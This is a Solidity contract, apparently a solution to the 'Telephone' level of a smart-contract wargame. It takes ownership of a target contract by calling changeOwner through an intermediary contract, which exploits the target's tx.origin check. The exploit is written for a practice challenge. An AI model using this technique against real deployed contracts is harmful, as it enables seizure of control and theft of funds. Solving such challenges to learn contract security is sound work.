// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./Telephone.sol";

contract HackTelephone {

  Telephone public telephone;

  constructor(address _telephone) public {
    telephone = Telephone(_telephone);
  }

  function getOwnership() public {

    telephone.changeOwner(msg.sender);
    console.log("msg sender = %s ",msg.sender);
  }
}
